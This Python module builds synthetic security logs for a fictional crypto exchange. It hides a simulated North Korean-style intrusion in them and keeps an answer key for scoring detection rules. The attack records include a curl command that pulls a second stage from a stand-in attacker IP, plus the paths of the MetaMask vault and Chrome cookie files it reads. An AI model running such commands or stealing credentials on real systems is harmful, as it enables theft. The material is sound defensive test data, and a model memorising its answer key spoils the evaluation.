"""Synthetic internal telemetry for a fictional crypto exchange, "Meridian Exchange", with one attack hidden inside.

Five log sources, the kind a SIEM holds:
  auth_events        identity provider sign-ins (Okta-like)
  endpoint_events    EDR process events from employee laptops
  network_events     web proxy / DNS, with the proxy's domain category
  cloud_audit        cloud control-plane audit (CloudTrail-like)
  wallet_withdrawals customer and internal withdrawals from the exchange's hot wallet

The attack follows public reporting on DPRK "Contagious Interview" / TraderTraitor intrusions: a fake recruiter sends
an engineer a coding test; its npm package runs a JavaScript downloader (BeaverTail-style) that fetches a Python
backdoor (InvisibleFerret-style); the backdoor steals browser wallet data and session cookies; the attacker replays the
session, reads the hot-wallet API key from the secrets store, mints a new access key, and withdraws funds - including to
a real OFAC-sanctioned Lazarus address. Benign activity deliberately includes look-alikes (other engineers running
npm/node/curl, travelling staff signing in abroad) so detections have to be precise.

`scenario_events` is the answer key: each attack event's id, step and ATT&CK technique. Detection and eval steps score
themselves against it. Everything is deterministic for a given seed. All domains and IPs are reserved values
(.example / .test, RFC 5737 / 2544 / 6598), except the sanctioned address, which is public OFAC data.
"""

import hashlib
import json
import random
from collections.abc import Iterator
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import duckdb

COMPANY_DOMAIN = "meridianx.test"
OFFICE_NET = "198.51.100"  # RFC 5737 TEST-NET-2: office egress
HOME_NET = "192.0.2"  # RFC 5737 TEST-NET-1: employees at home
ATTACKER_NET = "203.0.113"  # RFC 5737 TEST-NET-3: attacker infrastructure
TRAVEL_NET = "198.18.7"  # RFC 2544 benchmark range: hotel Wi-Fi for travelling staff
C2_IP = f"{ATTACKER_NET}.47"
REPLAY_IP = f"{ATTACKER_NET}.88"
FAKE_RECRUITER = "blocknexus-careers.example"
LURE_REPO = "https://bitbucket.example/blocknexus-dev/trading-assessment.git"
SANCTIONED_ADDRESS = "0x098B716B8Aaf21512996dC57EB0615e2383E2f96"  # OFAC SDN: Lazarus Group (Ronin bridge theft, 2022)
METAMASK = "nkbihfbeogaeaoehlefnkodbefgpgknn"  # MetaMask's Chrome extension id
CHROME_PROFILE = "/Users/{user}/Library/Application Support/Google/Chrome/Default"
VICTIM = "d.okafor"

TEAMS = {"engineering": 24, "platform": 6, "wallet-ops": 5, "support": 12, "finance": 5, "security": 4, "exec": 4}
APPS = {
    "engineering": ["okta", "github", "slack", "jira", "aws-console"],
    "platform": ["okta", "github", "slack", "aws-console", "signing-service"],
    "wallet-ops": ["okta", "slack", "signing-service", "admin-console"],
    "support": ["okta", "slack", "zendesk", "admin-console"],
    "finance": ["okta", "slack", "netsuite"],
    "security": ["okta", "slack", "github", "aws-console", "splunk"],
    "exec": ["okta", "slack", "google-workspace"],
}
FIRST = ["a", "b", "c", "d", "e", "f", "g", "h", "j", "k", "l", "m", "n", "p", "r", "s", "t", "v", "w", "y"]
LAST = [
    "nguyen",
    "patel",
    "garcia",
    "kim",
    "cohen",
    "silva",
    "mensah",
    "ivanova",
    "tanaka",
    "oconnor",
    "haddad",
    "novak",
    "rossi",
    "berg",
    "costa",
    "adeyemi",
    "larsen",
    "sato",
    "mehta",
    "fischer",
    "lopez",
    "wright",
]
BENIGN_DOMAINS = {
    "business": ["slack.com", "zoom.us", "notion.so", "google.com", "okta.com", "zendesk.com", "linkedin.com"],
    "software-dev": [
        "github.com",
        "api.github.com",
        "registry.npmjs.org",
        "pypi.org",
        "files.pythonhosted.org",
        "docker.io",
        "stackoverflow.com",
    ],
    "cloud": ["amazonaws.com", "s3.amazonaws.com", "cloudfront.net"],
    "crypto": ["coingecko.com", "etherscan.io", "blockchair.com"],
    "internal": [f"admin.{COMPANY_DOMAIN}", f"signing.{COMPANY_DOMAIN}", f"wiki.{COMPANY_DOMAIN}"],
}
CHAINS = {
    "BTC": ("XBT", 65000.0),
    "ETH": ("ETH", 3200.0),
    "USDT": ("ETH", 1.0),
    "USDC": ("ETH", 1.0),
    "SOL": ("SOL", 150.0),
}


@dataclass(frozen=True)
class Employee:
    user: str
    team: str
    host: str
    home_ip: str


class Generator:
    def __init__(self, seed: int = 7, start: datetime = datetime(2026, 10, 12, tzinfo=UTC), days: int = 7):
        self.rnd = random.Random(seed)
        self.start, self.days = start, days
        self.counters: dict[str, int] = {}
        self.events: dict[str, list[dict[str, Any]]] = {t: [] for t in TABLES}
        self.answer_key: list[dict[str, Any]] = []
        self.employees = self._employees()
        self.victim = next(e for e in self.employees if e.user == VICTIM)

    # ------------------------------------------------------------ helpers

    def _employees(self) -> list[Employee]:
        people, used = [], {VICTIM}
        people.append(Employee(VICTIM, "platform", "mx-lt-0017", f"{HOME_NET}.17"))
        n = 0
        for team, size in TEAMS.items():
            for _ in range(size - (1 if team == "platform" else 0)):
                while True:
                    user = f"{self.rnd.choice(FIRST)}.{self.rnd.choice(LAST)}"
                    if user not in used:
                        used.add(user)
                        break
                n += 1
                host = f"mx-lt-{n + 100:04d}"
                people.append(Employee(user, team, host, f"{HOME_NET}.{self.rnd.randint(20, 250)}"))
        return people

    def _id(self, table: str) -> str:
        self.counters[table] = self.counters.get(table, 0) + 1
        return f"{PREFIX[table]}-{self.counters[table]:07d}"

    def _emit(self, table: str, ts: datetime, **fields: Any) -> str:
        event_id = self._id(table)
        self.events[table].append({"event_id": event_id, "ts": ts, **fields})
        return event_id

    def _attack(self, table: str, ts: datetime, step: int, technique: str, what: str, **fields: Any) -> str:
        event_id = self._emit(table, ts, **fields)
        self.answer_key.append(
            {
                "event_id": event_id,
                "table_name": table,
                "step": step,
                "technique_id": technique,
                "description": what,
                "ts": ts,
            }
        )
        return event_id

    def _sha256(self, seed: str) -> str:
        return hashlib.sha256(seed.encode()).hexdigest()

    def _address(self, chain: str) -> str:
        if chain == "XBT":
            return "bc1q" + "".join(self.rnd.choice("023456789acdefghjklmnpqrstuvwxyz") for _ in range(38))
        if chain == "SOL":
            return "".join(
                self.rnd.choice("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz") for _ in range(44)
            )
        return "0x" + "".join(self.rnd.choice("0123456789abcdef") for _ in range(40))

    def _workday(self, day: int) -> Iterator[datetime]:
        """Timestamps across a working day (UTC 13:00-23:00, roughly US business hours)."""
        base = self.start + timedelta(days=day)
        while True:
            yield base + timedelta(hours=13, seconds=self.rnd.randint(0, 10 * 3600))

    # ------------------------------------------------------------ benign activity

    def benign(self) -> None:
        for day in range(self.days):
            weekend = (self.start + timedelta(days=day)).weekday() >= 5
            for emp in self.employees:
                if weekend and self.rnd.random() < 0.85:
                    continue
                clock = self._workday(day)
                self._benign_auth(emp, clock, day)
                self._benign_endpoint_and_network(emp, clock)
                if emp.team in ("engineering", "platform", "security", "wallet-ops"):
                    self._benign_cloud(emp, clock)
            self._benign_withdrawals(day)
            self._service_activity(day)

    def _benign_auth(self, emp: Employee, clock: Iterator[datetime], day: int) -> None:
        travelling = emp.team == "exec" and day in (2, 3) and self.rnd.random() < 0.5
        at_office = self.rnd.random() < 0.55
        ip = f"{OFFICE_NET}.{self.rnd.randint(10, 60)}" if at_office else emp.home_ip
        country, asn = ("US", "AS64500 Meridian Exchange") if at_office else ("US", "AS64501 Residential ISP")
        if travelling:  # legitimate sign-ins from abroad, with MFA: a false-positive trap for "foreign login" rules
            ip, country, asn = f"{TRAVEL_NET}.{self.rnd.randint(2, 250)}", "GB", "AS64520 Hotel WiFi"
        session = self._sha256(f"{emp.user}-{day}")[:24]
        for app in APPS[emp.team]:
            if self.rnd.random() < 0.08:
                self._emit(
                    "auth_events",
                    next(clock),
                    user_name=emp.user,
                    app=app,
                    outcome="failure",
                    mfa_method=None,
                    src_ip=ip,
                    country=country,
                    asn=asn,
                    user_agent=UA_MAC,
                    session_id=None,
                    reason="invalid_password",
                )
            self._emit(
                "auth_events",
                next(clock),
                user_name=emp.user,
                app=app,
                outcome="success",
                mfa_method="webauthn" if app == "okta" else None,
                src_ip=ip,
                country=country,
                asn=asn,
                user_agent=UA_MAC,
                session_id=session,
                reason=None,
            )

    def _benign_endpoint_and_network(self, emp: Employee, clock: Iterator[datetime]) -> None:
        base = [
            ("Google Chrome", "launchd", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
            ("Slack", "launchd", "/Applications/Slack.app/Contents/MacOS/Slack"),
            ("zoom.us", "launchd", "/Applications/zoom.us.app/Contents/MacOS/zoom.us"),
        ]
        dev = [
            ("git", "zsh", "git pull --rebase"),
            ("git", "zsh", "git clone https://github.com/meridianx/{repo}.git"),
            ("npm", "zsh", "npm install"),
            ("node", "npm", "node scripts/build.js"),
            ("node", "zsh", "node server.js"),
            ("python3", "zsh", "python3 -m pytest"),
            ("curl", "zsh", "curl -s https://api.github.com/repos/meridianx/{repo}"),
            ("docker", "zsh", "docker compose up -d"),
        ]
        procs = base + (dev * 2 if emp.team in ("engineering", "platform", "security") else [])
        for _ in range(self.rnd.randint(8, 20)):
            name, parent, cmd = self.rnd.choice(procs)
            cmd = cmd.format(repo=self.rnd.choice(["exchange-api", "web", "risk-engine", "ledger", "infra"]))
            self._emit(
                "endpoint_events",
                next(clock),
                host=emp.host,
                user_name=emp.user,
                process=name,
                parent_process=parent,
                command_line=cmd,
                sha256=self._sha256(name),
                file_path=None,
                action="process_start",
            )
            if name in ("npm", "node", "curl", "git", "python3"):
                domain = {
                    "npm": "registry.npmjs.org",
                    "git": "github.com",
                    "curl": "api.github.com",
                    "python3": "pypi.org",
                    "node": "registry.npmjs.org",
                }[name]
                self._network(emp, next(clock), name, domain, "software-dev", 443)
        for _ in range(self.rnd.randint(25, 60)):
            category = self.rnd.choice(["business", "business", "software-dev", "cloud", "crypto", "internal"])
            self._network(emp, next(clock), "Google Chrome", self.rnd.choice(BENIGN_DOMAINS[category]), category, 443)

    def _network(
        self,
        emp: Employee,
        ts: datetime,
        process: str,
        domain: str,
        category: str,
        port: int,
        dest_ip: str | None = None,
        bytes_out: int | None = None,
    ) -> str:
        return self._emit(
            "network_events",
            ts,
            host=emp.host,
            user_name=emp.user,
            process=process,
            src_ip=emp.home_ip,
            dest_domain=domain,
            dest_ip=dest_ip or f"100.{self.rnd.randint(64, 127)}.{self.rnd.randint(0, 255)}.{self.rnd.randint(1, 254)}",
            dest_port=port,
            protocol="https" if port == 443 else "http",
            bytes_out=bytes_out or self.rnd.randint(400, 60_000),
            bytes_in=self.rnd.randint(1_000, 900_000),
            category=category,
            action="allowed",
        )

    def _benign_cloud(self, emp: Employee, clock: Iterator[datetime]) -> None:
        actions = {
            "engineering": [
                ("s3:GetObject", "arn:aws:s3:::mx-build-artifacts/*"),
                ("logs:FilterLogEvents", "arn:aws:logs:us-east-1:111122223333:log-group:/ecs/exchange-api"),
                ("ecs:DescribeServices", "arn:aws:ecs:us-east-1:111122223333:service/prod/exchange-api"),
            ],
            "platform": [
                ("ecs:UpdateService", "arn:aws:ecs:us-east-1:111122223333:service/prod/exchange-api"),
                (
                    "secretsmanager:GetSecretValue",
                    "arn:aws:secretsmanager:us-east-1:111122223333:secret:staging/db-password",
                ),
                ("kms:Decrypt", "arn:aws:kms:us-east-1:111122223333:key/staging"),
            ],
            "security": [("cloudtrail:LookupEvents", "*"), ("iam:ListUsers", "*")],
            "wallet-ops": [("signing:ApproveWithdrawal", "arn:aws:execute-api:us-east-1:111122223333:signing/approve")],
        }[emp.team]
        for _ in range(self.rnd.randint(2, 8)):
            action, resource = self.rnd.choice(actions)
            self._emit(
                "cloud_audit",
                next(clock),
                principal=emp.user,
                principal_type="federated-user",
                action=action,
                resource=resource,
                src_ip=f"{OFFICE_NET}.{self.rnd.randint(10, 60)}",
                user_agent="aws-cli/2.27",
                outcome="success",
            )

    def _service_activity(self, day: int) -> None:
        """The withdrawals service reads its own API key routinely - from inside the VPC, as a service role."""
        clock = self._workday(day)
        for _ in range(6):
            self._emit(
                "cloud_audit",
                next(clock),
                principal="role/withdrawals-service",
                principal_type="assumed-role",
                action="secretsmanager:GetSecretValue",
                resource="arn:aws:secretsmanager:us-east-1:111122223333:secret:prod/hot-wallet/withdrawal-api-key",
                src_ip="10.20.4.17",
                user_agent="aws-sdk-go-v2",
                outcome="success",
            )

    def _benign_withdrawals(self, day: int) -> None:
        for _ in range(self.rnd.randint(320, 420)):
            ts = self.start + timedelta(days=day, seconds=self.rnd.randint(0, 86_399))
            asset = self.rnd.choice(list(CHAINS))
            chain, price = CHAINS[asset]
            amount = round(self.rnd.lognormvariate(0, 1.4) * (0.05 if price > 1000 else 300), 6)
            risk = self.rnd.randint(1, 35)
            self._emit(
                "wallet_withdrawals",
                ts,
                withdrawal_id=self._sha256(f"w{day}{ts}")[:16],
                account_id=f"cust-{self.rnd.randint(100000, 999999)}",
                initiated_by="customer",
                channel=self.rnd.choice(["mobile-app", "web-app"]),
                asset=asset,
                chain=chain,
                amount=amount,
                usd_value=round(amount * price, 2),
                to_address=self._address(chain),
                status="completed" if risk < 30 else "held_for_review",
                risk_score=risk,
                approver=None,
            )

    # ------------------------------------------------------------ the attack

    def attack(self) -> None:
        v, day = self.victim, self.start + timedelta(days=2)  # Wednesday
        t = day + timedelta(hours=18, minutes=2)
        mins = lambda m: t + timedelta(minutes=m)  # noqa: E731

        self._attack(
            "network_events",
            mins(0),
            1,
            "T1566.003",
            "Victim opens the fake recruiter's job page after a LinkedIn message",
            host=v.host,
            user_name=v.user,
            process="Google Chrome",
            src_ip=v.home_ip,
            dest_domain=FAKE_RECRUITER,
            dest_ip=f"{ATTACKER_NET}.21",
            dest_port=443,
            protocol="https",
            bytes_out=2_310,
            bytes_in=48_200,
            category="newly-registered",
            action="allowed",
        )
        self._attack(
            "endpoint_events",
            mins(18),
            2,
            "T1204.002",
            "Victim clones the 'coding assessment' repository",
            host=v.host,
            user_name=v.user,
            process="git",
            parent_process="zsh",
            command_line=f"git clone {LURE_REPO}",
            sha256=self._sha256("git"),
            file_path=None,
            action="process_start",
        )
        self._attack(
            "endpoint_events",
            mins(22),
            3,
            "T1059.007",
            "npm install runs the package's postinstall JavaScript (BeaverTail-style loader)",
            host=v.host,
            user_name=v.user,
            process="node",
            parent_process="npm",
            command_line="node ./node_modules/.bin/tailwind-config-init --postinstall",
            sha256=self._sha256("beavertail"),
            file_path=None,
            action="process_start",
        )
        self._attack(
            "endpoint_events",
            mins(23),
            4,
            "T1105",
            "The loader downloads a second stage with curl",
            host=v.host,
            user_name=v.user,
            process="curl",
            parent_process="node",
            command_line=f"curl -s -o /Users/{v.user}/.n2/p.zip http://{C2_IP}:1224/pdown",
            sha256=self._sha256("curl"),
            file_path=f"/Users/{v.user}/.n2/p.zip",
            action="process_start",
        )
        self._attack(
            "network_events",
            mins(23),
            4,
            "T1105",
            "Second-stage download from the C2 server on port 1224",
            host=v.host,
            user_name=v.user,
            process="curl",
            src_ip=v.home_ip,
            dest_domain=None,
            dest_ip=C2_IP,
            dest_port=1224,
            protocol="http",
            bytes_out=310,
            bytes_in=2_840_000,
            category="uncategorized",
            action="allowed",
        )
        self._attack(
            "endpoint_events",
            mins(24),
            5,
            "T1059.006",
            "Python backdoor starts from a hidden folder (InvisibleFerret-style)",
            host=v.host,
            user_name=v.user,
            process="python3",
            parent_process="node",
            command_line=f"python3 /Users/{v.user}/.n2/pay",
            sha256=self._sha256("invisibleferret"),
            file_path=f"/Users/{v.user}/.n2/pay",
            action="process_start",
        )
        self._attack(
            "endpoint_events",
            mins(26),
            6,
            "T1555.003",
            "Backdoor reads the MetaMask browser-extension vault",
            host=v.host,
            user_name=v.user,
            process="python3",
            parent_process="node",
            command_line=None,
            sha256=self._sha256("invisibleferret"),
            action="file_read",
            file_path=f"{CHROME_PROFILE.format(user=v.user)}/Local Extension Settings/{METAMASK}/000003.log",
        )
        self._attack(
            "endpoint_events",
            mins(26),
            7,
            "T1539",
            "Backdoor copies Chrome's cookie database (session cookies)",
            host=v.host,
            user_name=v.user,
            process="python3",
            parent_process="node",
            command_line=None,
            sha256=self._sha256("invisibleferret"),
            action="file_read",
            file_path=f"{CHROME_PROFILE.format(user=v.user)}/Cookies",
        )
        self._attack(
            "network_events",
            mins(29),
            8,
            "T1041",
            "Stolen data sent to the C2 server",
            host=v.host,
            user_name=v.user,
            process="python3",
            src_ip=v.home_ip,
            dest_domain=None,
            dest_ip=C2_IP,
            dest_port=1245,
            protocol="http",
            bytes_out=48_600_000,
            bytes_in=1_200,
            category="uncategorized",
            action="allowed",
        )

        # Hours later: the attacker replays the stolen session from their own infrastructure. No MFA prompt.
        session = self._sha256(f"{v.user}-2")[:24]
        night = day + timedelta(hours=27, minutes=40)  # 03:40 UTC next day, outside the victim's working hours
        later = lambda m: night + timedelta(minutes=m)  # noqa: E731
        for i, app in enumerate(["okta", "aws-console"]):
            self._attack(
                "auth_events",
                later(i),
                9,
                "T1550.004",
                f"Stolen session cookie replayed to {app} from attacker infrastructure",
                user_name=v.user,
                app=app,
                outcome="success",
                mfa_method=None,
                src_ip=REPLAY_IP,
                country="SG",
                asn="AS64510 Cheap VPS Ltd",
                user_agent=UA_MAC,
                session_id=session,
                reason="session_reuse",
            )
        self._attack(
            "cloud_audit",
            later(6),
            10,
            "T1555.006",
            "Reads the hot-wallet withdrawal API key from Secrets Manager",
            principal=v.user,
            principal_type="federated-user",
            action="secretsmanager:GetSecretValue",
            resource="arn:aws:secretsmanager:us-east-1:111122223333:secret:prod/hot-wallet/withdrawal-api-key",
            src_ip=REPLAY_IP,
            user_agent="aws-cli/2.27",
            outcome="success",
        )
        self._attack(
            "cloud_audit",
            later(9),
            11,
            "T1098.001",
            "Creates a new access key for the withdrawals service user (persistence)",
            principal=v.user,
            principal_type="federated-user",
            action="iam:CreateAccessKey",
            resource="arn:aws:iam::111122223333:user/svc-withdrawals",
            src_ip=REPLAY_IP,
            user_agent="aws-cli/2.27",
            outcome="success",
        )
        thefts = [
            ("ETH", 412.5, self._address("ETH"), "completed"),
            ("USDT", 1_850_000.0, SANCTIONED_ADDRESS, "completed"),
            ("ETH", 1_200.0, self._address("ETH"), "pending"),
        ]
        for i, (asset, amount, address, status) in enumerate(thefts):
            chain, price = CHAINS[asset]
            self._attack(
                "wallet_withdrawals",
                later(20 + i * 3),
                12,
                "T1657",
                f"Hot-wallet withdrawal of {amount:,} {asset} via the stolen API key",
                withdrawal_id=self._sha256(f"theft{i}")[:16],
                account_id="treasury-hot-01",
                initiated_by="api-key:svc-withdrawals",
                channel="internal-api",
                asset=asset,
                chain=chain,
                amount=amount,
                usd_value=round(amount * price, 2),
                to_address=address,
                status=status,
                risk_score=41 + i * 7,
                approver=None,
            )


UA_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 Chrome/141.0 Safari/537.36"
PREFIX = {
    "auth_events": "auth",
    "endpoint_events": "edr",
    "network_events": "net",
    "cloud_audit": "cld",
    "wallet_withdrawals": "wdr",
}
TABLES = list(PREFIX)
EMPTY_SCHEMAS = {
    "scenario_events": "event_id VARCHAR, table_name VARCHAR, step BIGINT, technique_id VARCHAR, "
    "description VARCHAR, ts TIMESTAMPTZ"
}


BASELINE_SEED, BASELINE_START = 21, datetime(2026, 10, 19, tzinfo=UTC)  # a later week, different people and noise


def generate(
    out_dir: Path,
    db_path: Path,
    seed: int = 7,
    days: int = 7,
    start: datetime = datetime(2026, 10, 12, tzinfo=UTC),
    with_attack: bool = True,
) -> dict[str, int]:
    """Write one JSONL file per log source plus the answer key, and load them all into DuckDB. Returns row counts.

    with_attack=False produces a normal-only week (the "baseline"): detections are tested on it to catch rules that
    would fire on ordinary activity they were never shown.
    """
    gen = Generator(seed=seed, start=start, days=days)
    gen.benign()
    if with_attack:  # without it: a normal-only week, for checking detections don't fire on ordinary activity
        gen.attack()
    out_dir.mkdir(parents=True, exist_ok=True)
    tables = {**gen.events, "scenario_events": gen.answer_key}
    for name, rows in tables.items():
        rows.sort(key=lambda r: r["ts"])
        with (out_dir / f"{name}.jsonl").open("w") as f:
            for row in rows:
                f.write(json.dumps({**row, "ts": row["ts"].isoformat()}) + "\n")
    db_path.unlink(missing_ok=True)
    with duckdb.connect(str(db_path)) as con:
        for name, rows in tables.items():
            if not rows:  # e.g. the answer key of a normal-only week: no rows to infer columns from
                con.execute(f"CREATE TABLE {name} ({EMPTY_SCHEMAS[name]})")
                continue
            con.execute(
                f"CREATE TABLE {name} AS SELECT * REPLACE (CAST(ts AS TIMESTAMPTZ) AS ts) "
                f"FROM read_json_auto(?, format='newline_delimited', sample_size=-1)",
                [str(out_dir / f"{name}.jsonl")],
            )
        con.execute(
            "CREATE TABLE employees AS SELECT * FROM (VALUES "
            + ", ".join(f"('{e.user}', '{e.team}', '{e.host}')" for e in gen.employees)
            + ") AS t(user_name, team, host)"
        )
        return {name: con.execute(f"SELECT count(*) FROM {name}").fetchone()[0] for name in [*tables, "employees"]}
